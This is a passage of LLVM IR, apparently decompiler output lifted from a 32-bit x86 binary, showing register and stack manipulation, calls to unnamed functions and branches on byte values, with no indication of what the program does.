  %v1_804a162 = inttoptr i32 %v0_804a162 to i32*
  %v2_804a162 = load i32, i32* %v1_804a162, align 4
  store i32 %v2_804a162, i32* %edi.global-to-local, align 4
  %v3_804a162 = add i32 %v0_804a162, 4
  %v1_804a163 = inttoptr i32 %v3_804a162 to i32*
  %v2_804a163 = load i32, i32* %v1_804a163, align 4
  store i32 %v2_804a163, i32* %eax.global-to-local, align 4
  %v1_804a164 = add i32 %v0_804a162, 100
  %v2_804a164 = inttoptr i32 %v1_804a164 to i32*
  %v3_804a164 = load i32, i32* %v2_804a164, align 4
  %v1_804a168 = add i32 %v3_804a164, 1028
  %v2_804a168 = inttoptr i32 %v1_804a168 to i32*
  %v3_804a168 = load i32, i32* %v2_804a168, align 4
  store i32 %v3_804a168, i32* @eax, align 4
  %v1_804a16e = inttoptr i32 %v3_804a168 to i32*
  %v2_804a16e = load i32, i32* %v1_804a16e, align 4
  store i32 %v2_804a16e, i32* %v1_804a163, align 4
  %v0_804a170 = load i32, i32* @ebx, align 4
  store i32 %v0_804a170, i32* %v1_804a162, align 4
  %v2_804a171 = inttoptr i32 %stack_var_-2308.8 to i8*
  %v3_804a171 = call i32 @function_804a698(i8* %v2_804a171, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804a171, i32* @eax, align 4
  %v0_804a176 = load i32, i32* @esp, align 4
  %v1_804a176 = inttoptr i32 %v0_804a176 to i32*
  %v3_804a176 = add i32 %v0_804a176, 4
  %v1_804a177 = inttoptr i32 %v3_804a176 to i32*
  store i32 ptrtoint ([11 x i8]* @global_var_804d501.62 to i32), i32* %v1_804a177, align 4
  %v0_804a17d = load i32, i32* @ebx, align 4
  store i32 %v0_804a17d, i32* %v1_804a176, align 4
  %v3_804a17e = call i32 @function_804a698(i8* %v2_804a171, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804a17e, i32* %eax.global-to-local, align 4
  %v0_804a183 = load i32, i32* @esp, align 4
  %v1_804a183 = inttoptr i32 %v0_804a183 to i32*
  %v2_804a183 = load i32, i32* %v1_804a183, align 4
  store i32 %v2_804a183, i32* %eax.global-to-local, align 4
  %v3_804a183 = add i32 %v0_804a183, 4
  %v1_804a184 = inttoptr i32 %v3_804a183 to i32*
  %v2_804a184 = load i32, i32* %v1_804a184, align 4
  store i32 %v2_804a184, i32* %edx.global-to-local, align 4
  %v1_804a185 = add i32 %v0_804a183, 100
  %v2_804a185 = inttoptr i32 %v1_804a185 to i32*
  %v3_804a185 = load i32, i32* %v2_804a185, align 4
  store i32 %v3_804a185, i32* @edi, align 4
  %v1_804a189 = add i32 %v3_804a185, 1028
  %v2_804a189 = inttoptr i32 %v1_804a189 to i32*
  %v3_804a189 = load i32, i32* %v2_804a189, align 4
  store i32 %v3_804a189, i32* @eax, align 4
  %v1_804a18f = add i32 %v3_804a189, 4
  %v2_804a18f = inttoptr i32 %v1_804a18f to i32*
  %v3_804a18f = load i32, i32* %v2_804a18f, align 4
  store i32 %v3_804a18f, i32* %v1_804a184, align 4
  %v0_804a192 = load i32, i32* @ebx, align 4
  store i32 %v0_804a192, i32* %v1_804a183, align 4
  %v3_804a193 = call i32 @function_804a698(i8* %v2_804a171, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804a193, i32* %eax.global-to-local, align 4
  %v0_804a198 = load i32, i32* @esp, align 4
  %v1_804a198 = inttoptr i32 %v0_804a198 to i32*
  %v2_804a198 = load i32, i32* %v1_804a198, align 4
  store i32 %v2_804a198, i32* @esi, align 4
  %v3_804a198 = add i32 %v0_804a198, 4
  %v1_804a199 = inttoptr i32 %v3_804a198 to i32*
  %v2_804a199 = load i32, i32* %v1_804a199, align 4
  store i32 %v2_804a199, i32* @eax, align 4
  store i32 ptrtoint ([14 x i8]* @global_var_804d567.66 to i32), i32* %v1_804a199, align 4
  %v0_804a19f = load i32, i32* @ebx, align 4
  store i32 %v0_804a19f, i32* %v1_804a198, align 4
  %v3_804a1a0 = call i32 @function_804a698(i8* %v2_804a171, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804a1a0, i32* %eax.global-to-local, align 4
  %v0_804a1a5 = load i32, i32* @ebx, align 4
  %v1_804a1a5 = load i32, i32* @esp, align 4
  %v2_804a1a5 = inttoptr i32 %v1_804a1a5 to i32*
  store i32 %v0_804a1a5, i32* %v2_804a1a5, align 4
  %v1_804a1a8 = call i32 @function_804a688(i32 %stack_var_-2308.8)
  store i32 %v1_804a1a8, i32* %eax.global-to-local, align 4
  %v0_804a1ad = load i32, i32* @esp, align 4
  %v1_804a1ad = add i32 %v0_804a1ad, -4
  %v2_804a1ad = inttoptr i32 %v1_804a1ad to i32*
  store i32 16384, i32* %v2_804a1ad, align 4
  %v2_804a1b2 = add i32 %v0_804a1ad, -8
  %v3_804a1b2 = inttoptr i32 %v2_804a1b2 to i32*
  store i32 %v1_804a1a8, i32* %v3_804a1b2, align 4
  %v0_804a1b3 = load i32, i32* @ebx, align 4
  %v2_804a1b3 = add i32 %v0_804a1ad, -12
  %v3_804a1b3 = inttoptr i32 %v2_804a1b3 to i32*
  store i32 %v0_804a1b3, i32* %v3_804a1b3, align 4
  %v0_804a1b4 = load i32, i32* @edi, align 4
  %v1_804a1b4 = add i32 %v0_804a1b4, -8
  %v2_804a1b4 = inttoptr i32 %v1_804a1b4 to i32*
  %v3_804a1b4 = load i32, i32* %v2_804a1b4, align 4
  %v5_804a1b4 = add i32 %v0_804a1ad, -16
  %v6_804a1b4 = inttoptr i32 %v5_804a1b4 to i32*
  store i32 %v3_804a1b4, i32* %v6_804a1b4, align 4
  %v0_804a1b7 = call i32 @function_804b516()
  store i32 %v0_804a1b7, i32* %eax.global-to-local, align 4
  %tmp83 = icmp slt i32 %v0_804a1b7, 1
  br i1 %tmp83, label %dec_label_pc_804a502, label %dec_label_pc_804a1c7

dec_label_pc_804a1c7:                             ; preds = %dec_label_pc_804a143
  %v0_804a1bc = load i32, i32* @esp, align 4
  %v1_804a1c7 = add i32 %v0_804a1bc, 116
  %v2_804a1c7 = inttoptr i32 %v1_804a1c7 to i32*
  %v3_804a1c7 = load i32, i32* %v2_804a1c7, align 4
  store i32 %v3_804a1c7, i32* %eax.global-to-local, align 4
  %v1_804a1cb = add i32 %v3_804a1c7, 1026
  %v2_804a1cb = inttoptr i32 %v1_804a1cb to i8*
  %v3_804a1cb = load i8, i8* %v2_804a1cb, align 1
  %v4_804a1cb = zext i8 %v3_804a1cb to i32
  %v1_804a1d9 = add nuw nsw i32 %v4_804a1cb, 1
  store i32 %v1_804a1d9, i32* %edx.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_804f6a1.67 to i32), i32* %eax.global-to-local, align 4
  %v12_804a1db = icmp eq i32 %v1_804a1d9, ptrtoint (i8* @global_var_804f6a1.67 to i32)
  br i1 %v12_804a1db, label %dec_label_pc_804a510, label %dec_label_pc_804a1e3

dec_label_pc_804a1e3:                             ; preds = %dec_label_pc_804a1c7
  %v3_804a1e3 = load i32, i32* %v2_804a1c7, align 4
  store i32 %v3_804a1e3, i32* %edx.global-to-local, align 4
  %v1_804a1e7 = add i32 %v3_804a1e3, 1
  %v2_804a1e7 = inttoptr i32 %v1_804a1e7 to i8*
  %v3_804a1e7 = load i8, i8* %v2_804a1e7, align 1
  %v12_804a1e7 = icmp eq i8 %v3_804a1e7, 3
  %v1_804a1eb = icmp eq i1 %v12_804a1e7, false
  br i1 %v1_804a1eb, label %dec_label_pc_804a52a, label %dec_label_pc_804a40d

dec_label_pc_804a1f6:                             ; preds = %dec_label_pc_8049b28
  %v2_804a1f6 = add i32 %v0_804a536, -4
  %v3_804a1f6 = inttoptr i32 %v2_804a1f6 to i32*
  store i32 %v3_8049b28, i32* %v3_804a1f6, align 4
  %v1_804a1f7 = add i32 %v0_804a536, -8
  %v2_804a1f7 = inttoptr i32 %v1_804a1f7 to i32*
  store i32 1024, i32* %v2_804a1f7, align 4
  %v1_804a1fc = add i32 %v0_804a536, -12
  %v2_804a1fc = inttoptr i32 %v1_804a1fc to i32*
  store i32 0, i32* %v2_804a1fc, align 4
  %v1_804a1fe = add i32 %v0_804a536, 100
  store i32 %v1_804a1fe, i32* @ebx, align 4
  %v2_804a202 = add i32 %v0_804a536, -16
  %v3_804a202 = inttoptr i32 %v2_804a202 to i32*
  store i32 %v1_804a1fe, i32* %v3_804a202, align 4
  %v4_804a203 = call i32 @function_804a6fc(i32 %stack_var_-2308.8, i8 ptrtoint (i32* @0 to i8), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804a203, i32* %eax.global-to-local, align 4
  %v0_804a208 = load i32, i32* @esp, align 4
  %v1_804a208 = inttoptr i32 %v0_804a208 to i32*
  %v2_804a208 = load i32, i32* %v1_804a208, align 4
  store i32 %v2_804a208, i32* %eax.global-to-local, align 4
  %v3_804a208 = add i32 %v0_804a208, 4
  %v1_804a209 = inttoptr i32 %v3_804a208 to i32*
  %v2_804a209 = load i32, i32* %v1_804a209, align 4
  store i32 %v2_804a209, i32* %edx.global-to-local, align 4
  store i32 88, i32* %v1_804a209, align 4
  store i32 188, i32* %v1_804a208, align 4
  %v1_804a211 = add i32 %v0_804a208, -4
  %v2_804a211 = inttoptr i32 %v1_804a211 to i32*
  store i32 62, i32* %v2_804a211, align 4
  %v1_804a213 = add i32 %v0_804a208, -8
  %v2_804a213 = inttoptr i32 %v1_804a213 to i32*
  store i32 185, i32* %v2_804a213, align 4
  %v1_804a218 = add i32 %v0_804a208, -12
  %v2_804a218 = inttoptr i32 %v1_804a218 to i32*
  store i32 ptrtoint ([860 x i8]* @global_var_804d590.68 to i32), i32* %v2_804a218, align 4
  %v0_804a21d = load i32, i32* @ebx, align 4
  %v2_804a21d = add i32 %v0_804a208, -16
  %v3_804a21d = inttoptr i32 %v2_804a21d to i32*
  store i32 %v0_804a21d, i32* %v3_804a21d, align 4
  %v3_804a21e = call i32 @function_804ad34(i32 %stack_var_-2308.8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804a21e, i32* %eax.global-to-local, align 4
  %v0_804a223 = load i32, i32* @esp, align 4
  %v0_804a226 = load i32, i32* @ebx, align 4
  %v2_804a226 = add i32 %v0_804a223, 16
  %v3_804a226 = inttoptr i32 %v2_804a226 to i32*
  store i32 %v0_804a226, i32* %v3_804a226, align 4
  %v1_804a227 = call i32 @function_804a688(i32 %stack_var_-2308.8)
  store i32 %v1_804a227, i32* %eax.global-to-local, align 4
  %v0_804a22c = load i32, i32* @esp, align 4
  %v1_804a22c = add i32 %v0_804a22c, -4
  %v2_804a22c = inttoptr i32 %v1_804a22c to i32*
  store i32 16384, i32* %v2_804a22c, align 4
  %v2_804a231 = add i32 %v0_804a22c, -8
  %v3_804a231 = inttoptr i32 %v2_804a231 to i32*
  store i32 %v1_804a227, i32* %v3_804a231, align 4
  %v0_804a232 = load i32, i32* @ebx, align 4
  %v2_804a232 = add i32 %v0_804a22c, -12
  %v3_804a232 = inttoptr i32 %v2_804a232 to i32*
  store i32 %v0_804a232, i32* %v3_804a232, align 4
  %v1_804a233 = add i32 %v0_804a22c, 100
  %v2_804a233 = inttoptr i32 %v1_804a233 to i32*
  %v3_804a233 = load i32, i32* %v2_804a233, align 4
  %v1_804a237 = add i32 %v3_804a233, -8
  %v2_804a237 = inttoptr i32 %v1_804a237 to i32*
  %v3_804a237 = load i32, i32* %v2_804a237, align 4
  %v5_804a237 = add i32 %v0_804a22c, -16
  %v6_804a237 = inttoptr i32 %v5_804a237 to i32*
  store i32 %v3_804a237, i32* %v6_804a237, align 4
  br label %dec_label_pc_804a4f6

dec_label_pc_804a23f:                             ; preds = %dec_label_pc_8049b28
  %v3_804a23f = load i32, i32* %v2_8049b28, align 4
  store i32 %v3_804a23f, i32* @edi, align 4
  store i32 10, i32* @edx, align 4
  %v1_804a248 = add i32 %v3_804a23f, 1
  %v2_804a248 = inttoptr i32 %v1_804a248 to i8*
  %v3_804a248 = load i8, i8* %v2_804a248, align 1
  %v4_804a248 = zext i8 %v3_804a248 to i32
  store i32 %v4_804a248, i32* %eax.global-to-local, align 4
  %v10_804a24b = icmp eq i8 %v3_804a248, 2
  br i1 %v10_804a24b, label %dec_label_pc_804a515, label %dec_label_pc_804a253

dec_label_pc_804a253:                             ; preds = %dec_label_pc_804a23f
  %v10_804a253 = icmp eq i8 %v3_804a248, 3
  store i32 13, i32* @edx, align 4
  br i1 %v10_804a253, label %dec_label_pc_804a515, label %dec_label_pc_804a260

dec_label_pc_804a260:                             ; preds = %dec_label_pc_804a253
  %v1_804a263 = add i32 %v0_804a536, 40
  %v2_804a263 = inttoptr i32 %v1_804a263 to i32*
  %v3_804a263 = load i32, i32* %v2_804a263, align 4
  %v5_804a263 = add i32 %v0_804a536, -16
  %v6_804a263 = inttoptr i32 %v5_804a263 to i32*
  store i32 %v3_804a263, i32* %v6_804a263, align 4
  %v1_804a267 = call i32 @function_804a688(i32 %stack_var_-2308.8)
  store i32 %v1_804a267, i32* %eax.global-to-local, align 4
  %v0_804a26c = load i32, i32* @esp, align 4
  %v1_804a26c = add i32 %v0_804a26c, -4
  %v2_804a26c = inttoptr i32 %v1_804a26c to i32*
  store i32 16384, i32* %v2_804a26c, align 4
  %v2_804a271 = add i32 %v0_804a26c, -8
  %v3_804a271 = inttoptr i32 %v2_804a271 to i32*
  store i32 %v1_804a267, i32* %v3_804a271, align 4
  %v1_804a272 = add i32 %v0_804a26c, 56
  %v2_804a272 = inttoptr i32 %v1_804a272 to i32*
  %v3_804a272 = load i32, i32* %v2_804a272, align 4
  %v5_804a272 = add i32 %v0_804a26c, -12
  %v6_804a272 = inttoptr i32 %v5_804a272 to i32*
  store i32 %v3_804a272, i32* %v6_804a272, align 4
  %v1_804a276 = add i32 %v0_804a26c, 100
  %v2_804a276 = inttoptr i32 %v1_804a276 to i32*
  %v3_804a276 = load i32, i32* %v2_804a276, align 4
  store i32 %v3_804a276, i32* %eax.global-to-local, align 4
  %v1_804a27a = add i32 %v3_804a276, -8
  %v2_804a27a = inttoptr i32 %v1_804a27a to i32*
  %v3_804a27a = load i32, i32* %v2_804a27a, align 4
  %v5_804a27a = add i32 %v0_804a26c, -16
  %v6_804a27a = inttoptr i32 %v5_804a27a to i32*
  store i32 %v3_804a27a, i32* %v6_804a27a, align 4
  %v0_804a27d = call i32 @function_804b516()
  %v0_804a282 = load i32, i32* @esp, align 4
  %v1_804a285 = add i32 %v0_804a27d, -1
  %v5_804a285 = sub i32 0, %v0_804a27d
  %v6_804a285 = and i32 %v0_804a27d, %v5_804a285
  %v7_804a285 = icmp slt i32 %v6_804a285, 0
  %v8_804a285 = icmp eq i32 %v1_804a285, 0
  %v9_804a285 = icmp slt i32 %v1_804a285, 0
  store i32 %v1_804a285, i32* %eax.global-to-local, align 4
  %v3_804a286 = icmp eq i1 %v9_804a285, %v7_804a285
  %v4_804a286 = icmp eq i1 %v8_804a285, false
  %v5_804a286 = and i1 %v4_804a286, %v3_804a286
  br i1 %v5_804a286, label %dec_label_pc_804a502, label %dec_label_pc_804a28c

dec_label_pc_804a28c:                             ; preds = %dec_label_pc_804a260
  %v1_804a28c = add i32 %v0_804a282, 28
  %v2_804a28c = inttoptr i32 %v1_804a28c to i32*
  store i32 16384, i32* %v2_804a28c, align 4
  %v1_804a291 = add i32 %v0_804a282, 24
  %v2_804a291 = inttoptr i32 %v1_804a291 to i32*
  store i32 2, i32* %v2_804a291, align 4
  %v1_804a293 = add i32 %v0_804a282, 20
  %v2_804a293 = inttoptr i32 %v1_804a293 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_804d572.69 to i32), i32* %v2_804a293, align 4
  %v1_804a298 = add i32 %v0_804a282, 116
  %v2_804a298 = inttoptr i32 %v1_804a298 to i32*
  %v3_804a298 = load i32, i32* %v2_804a298, align 4
  store i32 %v3_804a298, i32* %edx.global-to-local, align 4
  %v1_804a29c = add i32 %v3_804a298, -8
  %v2_804a29c = inttoptr i32 %v1_804a29c to i32*
  %v3_804a29c = load i32, i32* %v2_804a29c, align 4
  %v5_804a29c = add i32 %v0_804a282, 16
  %v6_804a29c = inttoptr i32 %v5_804a29c to i32*
  store i32 %v3_804a29c, i32* %v6_804a29c, align 4
  %v0_804a29f = call i32 @function_804b516()
  store i32 %v0_804a29f, i32* %eax.global-to-local, align 4
  store i32 8, i32* @edx, align 4
  %tmp84 = icmp slt i32 %v0_804a29f, 1
  %tmp85 = icmp eq i1 %tmp84, false
  br i1 %tmp85, label %dec_label_pc_804a515, label %dec_label_pc_804a502

dec_label_pc_804a2b9:                             ; preds = %dec_label_pc_8049b28
  store i32 ptrtoint ([14 x i8]* @global_var_804d8ec.70 to i32), i32* @edx, align 4
  store i32 %v1_8049b30, i32* @eax, align 4
  %v0_804a2c0 = call i32 @function_8049639()
  store i32 %v0_804a2c0, i32* %eax.global-to-local, align 4
  %v1_804a2c5 = icmp eq i32 %v0_804a2c0, 0
  %v1_804a2c7 = icmp eq i1 %v1_804a2c5, false
  br i1 %v1_804a2c7, label %dec_label_pc_804a40d, label %dec_label_pc_804a2cd

dec_label_pc_804a2cd:                             ; preds = %dec_label_pc_804a2b9, %dec_label_pc_8049ecd
  store i32 7, i32* @edx, align 4
  br label %dec_label_pc_804a523

dec_label_pc_804a2d7:                             ; preds = %dec_label_pc_8049b28
  %v1_804a2da = add i32 %v0_804a536, 100
  store i32 %v1_804a2da, i32* @ebx, align 4
  %v2_804a2de = add i32 %v0_804a536, -16
  %v3_804a2de = inttoptr i32 %v2_804a2de to i32*
  store i32 %v1_804a2da, i32* %v3_804a2de, align 4
  %v1_804a2df = call i32 @function_804a688(i32 %stack_var_-2308.8)
  store i32 %v1_804a2df, i32* %eax.global-to-local, align 4
  %v0_804a2e4 = load i32, i32* @esp, align 4
  %v1_804a2e4 = add i32 %v0_804a2e4, -4
  %v2_804a2e4 = inttoptr i32 %v1_804a2e4 to i32*
  store i32 16384, i32* %v2_804a2e4, align 4
  %v2_804a2e9 = add i32 %v0_804a2e4, -8
  %v3_804a2e9 = inttoptr i32 %v2_804a2e9 to i32*
  store i32 %v1_804a2df, i32* %v3_804a2e9, align 4
  %v0_804a2ea = load i32, i32* @ebx, align 4
  %v2_804a2ea = add i32 %v0_804a2e4, -12
  %v3_804a2ea = inttoptr i32 %v2_804a2ea to i32*
  store i32 %v0_804a2ea, i32* %v3_804a2ea, align 4
  %v1_804a2eb = add i32 %v0_804a2e4, 100
  %v2_804a2eb = inttoptr i32 %v1_804a2eb to i32*
  %v3_804a2eb = load i32, i32* %v2_804a2eb, align 4
  %v1_804a2ef = add i32 %v3_804a2eb, -8
  %v2_804a2ef = inttoptr i32 %v1_804a2ef to i32*
  %v3_804a2ef = load i32, i32* %v2_804a2ef, align 4
  %v5_804a2ef = add i32 %v0_804a2e4, -16
  %v6_804a2ef = inttoptr i32 %v5_804a2ef to i32*
  store i32 %v3_804a2ef, i32* %v6_804a2ef, align 4
  %v0_804a2f2 = call i32 @function_804b516()
  store i32 %v0_804a2f2, i32* %eax.global-to-local, align 4
  %v0_804a2f7 = load i32, i32* @esp, align 4
  %tmp86 = icmp slt i32 %v0_804a2f2, 1
  br i1 %tmp86, label %dec_label_pc_804a502, label %dec_label_pc_804a302

dec_label_pc_804a302:                             ; preds = %dec_label_pc_804a2d7
  %v1_804a302 = add i32 %v0_804a2f7, 28
  %v2_804a302 = inttoptr i32 %v1_804a302 to i32*
  store i32 16384, i32* %v2_804a302, align 4
  %v1_804a307 = add i32 %v0_804a2f7, 24
  %v2_804a307 = inttoptr i32 %v1_804a307 to i32*
  store i32 2, i32* %v2_804a307, align 4
  %v1_804a309 = add i32 %v0_804a2f7, 20
  %v2_804a309 = inttoptr i32 %v1_804a309 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_804d572.69 to i32), i32* %v2_804a309, align 4
  %v1_804a30e = add i32 %v0_804a2f7, 116
  %v2_804a30e = inttoptr i32 %v1_804a30e to i32*
  %v3_804a30e = load i32, i32* %v2_804a30e, align 4
  store i32 %v3_804a30e, i32* @edi, align 4
  %v1_804a312 = add i32 %v3_804a30e, -8
  %v2_804a312 = inttoptr i32 %v1_804a312 to i32*
  %v3_804a312 = load i32, i32* %v2_804a312, align 4
  %v5_804a312 = add i32 %v0_804a2f7, 16
  %v6_804a312 = inttoptr i32 %v5_804a312 to i32*
  store i32 %v3_804a312, i32* %v6_804a312, align 4
  %v0_804a315 = call i32 @function_804b516()
  store i32 %v0_804a315, i32* %eax.global-to-local, align 4
  %v2_804a31d = icmp slt i32 %v0_804a315, 0
  br i1 %v2_804a31d, label %dec_label_pc_804a502, label %dec_label_pc_804a48a

dec_label_pc_804a32a:                             ; preds = %dec_label_pc_8049b28
  %v1_804a32d = add i32 %v0_804a536, 44
  %v2_804a32d = inttoptr i32 %v1_804a32d to i32*
  %v3_804a32d = load i32, i32* %v2_804a32d, align 4
  %v5_804a32d = add i32 %v0_804a536, -16
  %v6_804a32d = inttoptr i32 %v5_804a32d to i32*
  store i32 %v3_804a32d, i32* %v6_804a32d, align 4
  %v1_804a331 = call i32 @function_804a688(i32 %stack_var_-2308.8)
  store i32 %v1_804a331, i32* %eax.global-to-local, align 4
  %v0_804a336 = load i32, i32* @esp, align 4
  %v1_804a336 = add i32 %v0_804a336, -4
  %v2_804a336 = inttoptr i32 %v1_804a336 to i32*
  store i32 16384, i32* %v2_804a336, align 4
  %v2_804a33b = add i32 %v0_804a336, -8
  %v3_804a33b = inttoptr i32 %v2_804a33b to i32*
  store i32 %v1_804a331, i32* %v3_804a33b, align 4
  %v1_804a33c = add i32 %v0_804a336, 60
  %v2_804a33c = inttoptr i32 %v1_804a33c to i32*
  %v3_804a33c = load i32, i32* %v2_804a33c, align 4
  %v5_804a33c = add i32 %v0_804a336, -12
  %v6_804a33c = inttoptr i32 %v5_804a33c to i32*
  store i32 %v3_804a33c, i32* %v6_804a33c, align 4
  %v1_804a340 = add i32 %v0_804a336, 100
  %v2_804a340 = inttoptr i32 %v1_804a340 to i32*
  %v3_804a340 = load i32, i32* %v2_804a340, align 4
  store i32 %v3_804a340, i32* %eax.global-to-local, align 4
  %v1_804a344 = add i32 %v3_804a340, -8
  %v2_804a344 = inttoptr i32 %v1_804a344 to i32*
  %v3_804a344 = load i32, i32* %v2_804a344, align 4
  %v5_804a344 = add i32 %v0_804a336, -16
  %v6_804a344 = inttoptr i32 %v5_804a344 to i32*
  store i32 %v3_804a344, i32* %v6_804a344, align 4
  %v0_804a347 = call i32 @function_804b516()
  store i32 %v0_804a347, i32* %eax.global-to-local, align 4
  %v0_804a34c = load i32, i32* @esp, align 4
  %v2_804a34f = icmp slt i32 %v0_804a347, 0
  br i1 %v2_804a34f, label %dec_label_pc_804a502, label %dec_label_pc_804a357

dec_label_pc_804a357:                             ; preds = %dec_label_pc_804a32a
  %v1_804a357 = add i32 %v0_804a34c, 28
  %v2_804a357 = inttoptr i32 %v1_804a357 to i32*
  store i32 16384, i32* %v2_804a357, align 4
  %v1_804a35c = add i32 %v0_804a34c, 24
  %v2_804a35c = inttoptr i32 %v1_804a35c to i32*
  store i32 2, i32* %v2_804a35c, align 4
  %v1_804a35e = add i32 %v0_804a34c, 20
  %v2_804a35e = inttoptr i32 %v1_804a35e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_804d572.69 to i32), i32* %v2_804a35e, align 4
  %v1_804a363 = add i32 %v0_804a34c, 116
  %v2_804a363 = inttoptr i32 %v1_804a363 to i32*
  %v3_804a363 = load i32, i32* %v2_804a363, align 4
  store i32 %v3_804a363, i32* %edx.global-to-local, align 4
  %v1_804a367 = add i32 %v3_804a363, -8
  %v2_804a367 = inttoptr i32 %v1_804a367 to i32*
  %v3_804a367 = load i32, i32* %v2_804a367, align 4
  %v5_804a367 = add i32 %v0_804a34c, 16
  %v6_804a367 = inttoptr i32 %v5_804a367 to i32*
  store i32 %v3_804a367, i32* %v6_804a367, align 4
  %v0_804a36a = call i32 @function_804b516()
  store i32 %v0_804a36a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a502

dec_label_pc_804a377:                             ; preds = %dec_label_pc_8049b28
  %v3_804a377 = load i32, i32* %v2_8049b28, align 4
  store i32 %v3_804a377, i32* @ecx, align 4
  store i32 7, i32* @edx, align 4
  %v1_804a380 = add i32 %v3_804a377, 1
  %v2_804a380 = inttoptr i32 %v1_804a380 to i8*
  %v3_804a380 = load i8, i8* %v2_804a380, align 1
  %v4_804a380 = zext i8 %v3_804a380 to i32
  store i32 %v4_804a380, i32* %eax.global-to-local, align 4
  %v10_804a383 = icmp eq i8 %v3_804a380, 2
  br i1 %v10_804a383, label %dec_label_pc_804a515, label %dec_label_pc_804a38b

dec_label_pc_804a38b:                             ; preds = %dec_label_pc_804a377
  %v10_804a38b = icmp eq i8 %v3_804a380, 3
  store i32 11, i32* @edx, align 4
  br i1 %v10_804a38b, label %dec_label_pc_804a515, label %dec_label_pc_804a398

dec_label_pc_804a398:                             ; preds = %dec_label_pc_804a38b
  %v2_804a398 = add i32 %v0_804a536, -4
  %v3_804a398 = inttoptr i32 %v2_804a398 to i32*
  store i32 %v4_804a380, i32* %v3_804a398, align 4
  %v1_804a399 = add i32 %v0_804a536, -8
  %v2_804a399 = inttoptr i32 %v1_804a399 to i32*
  store i32 1024, i32* %v2_804a399, align 4
  %v1_804a39e = add i32 %v0_804a536, -12
  %v2_804a39e = inttoptr i32 %v1_804a39e to i32*
  store i32 0, i32* %v2_804a39e, align 4
  %v1_804a3a0 = add i32 %v0_804a536, 100
  store i32 %v1_804a3a0, i32* @esi, align 4
  %v2_804a3a4 = add i32 %v0_804a536, -16
  %v3_804a3a4 = inttoptr i32 %v2_804a3a4 to i32*
  store i32 %v1_804a3a0, i32* %v3_804a3a4, align 4
  %v4_804a3a5 = call i32 @function_804a6fc(i32 %stack_var_-2308.8, i8 ptrtoint (i32* @0 to i8), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804a3a5, i32* @eax, align 4
  %v0_804a3aa = load i32, i32* @esp, align 4
  %v1_804a3aa = inttoptr i32 %v0_804a3aa to i32*
  store i32 22, i32* %v1_804a3aa, align 4
  %v1_804a3b1 = trunc i32 %stack_var_-2308.8 to i8
  %v2_804a3b1 = call i32 @function_804818a(i8 %v1_804a3b1)
  store i32 %v2_804a3b1, i32* @eax, align 4
  %v0_804a3b6 = load i32, i32* @esp, align 4
  %v1_804a3b6 = inttoptr i32 %v0_804a3b6 to i32*
  store i32 22, i32* %v1_804a3b6, align 4
  %v2_804a3bd = call i32 @function_804828b(i8 %v1_804a3b1)
  store i32 %v2_804a3bd, i32* @eax, align 4
  %v0_804a3c2 = load i32, i32* @esp, align 4
  %v1_804a3c2 = inttoptr i32 %v0_804a3c2 to i32*
  store i32 22, i32* %v1_804a3c2, align 4
  store i32 %v2_804a3bd, i32* @ebx, align 4
  %v2_804a3cb = call i32 @function_804828b(i8 %v1_804a3b1)
  store i32 %v2_804a3cb, i32* %eax.global-to-local, align 4
  %v0_804a3d0 = load i32, i32* @ebx, align 4
  %v1_804a3d0 = load i32, i32* @esp, align 4
  %v2_804a3d0 = add i32 %v1_804a3d0, -4
  %v3_804a3d0 = inttoptr i32 %v2_804a3d0 to i32*
  store i32 %v0_804a3d0, i32* %v3_804a3d0, align 4
  %v2_804a3d1 = add i32 %v1_804a3d0, -8
  %v3_804a3d1 = inttoptr i32 %v2_804a3d1 to i32*
  store i32 %v2_804a3cb, i32* %v3_804a3d1, align 4
  %v1_804a3d2 = add i32 %v1_804a3d0, -12
  %v2_804a3d2 = inttoptr i32 %v1_804a3d2 to i32*
  store i32 ptrtoint ([852 x i8]* @global_var_804d8fa.71 to i32), i32* %v2_804a3d2, align 4
  %v0_804a3d7 = load i32, i32* @esi, align 4
  %v2_804a3d7 = add i32 %v1_804a3d0, -16
  %v3_804a3d7 = inttoptr i32 %v2_804a3d7 to i32*
  store i32 %v0_804a3d7, i32* %v3_804a3d7, align 4
  %v3_804a3d8 = call i32 @function_804ad34(i32 %stack_var_-2308.8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804a3d8, i32* @eax, align 4
  %v0_804a3dd = load i32, i32* @esp, align 4
  %v1_804a3e0 = add i32 %v0_804a3dd, 16
  %v2_804a3e0 = inttoptr i32 %v1_804a3e0 to i32*
  store i32 22, i32* %v2_804a3e0, align 4
  %v2_804a3e2 = call i32 @function_804820a(i8 %v1_804a3b1)
  store i32 %v2_804a3e2, i32* %eax.global-to-local, align 4
  %v0_804a3e7 = load i32, i32* @esi, align 4
  %v1_804a3e7 = load i32, i32* @esp, align 4
  %v2_804a3e7 = inttoptr i32 %v1_804a3e7 to i32*
  store i32 %v0_804a3e7, i32* %v2_804a3e7, align 4
  %v1_804a3ea = call i32 @function_804a688(i32 %stack_var_-2308.8)
  store i32 %v1_804a3ea, i32* %eax.global-to-local, align 4
  %v0_804a3ef = load i32, i32* @esp, align 4
  %v1_804a3ef = add i32 %v0_804a3ef, -4
  %v2_804a3ef = inttoptr i32 %v1_804a3ef to i32*
  store i32 16384, i32* %v2_804a3ef, align 4
  %v2_804a3f4 = add i32 %v0_804a3ef, -8
  %v3_804a3f4 = inttoptr i32 %v2_804a3f4 to i32*
  store i32 %v1_804a3ea, i32* %v3_804a3f4, align 4
  %v0_804a3f5 = load i32, i32* @esi, align 4
  %v2_804a3f5 = add i32 %v0_804a3ef, -12
  %v3_804a3f5 = inttoptr i32 %v2_804a3f5 to i32*
  store i32 %v0_804a3f5, i32* %v3_804a3f5, align 4
  %v1_804a3f6 = add i32 %v0_804a3ef, 100
  %v2_804a3f6 = inttoptr i32 %v1_804a3f6 to i32*
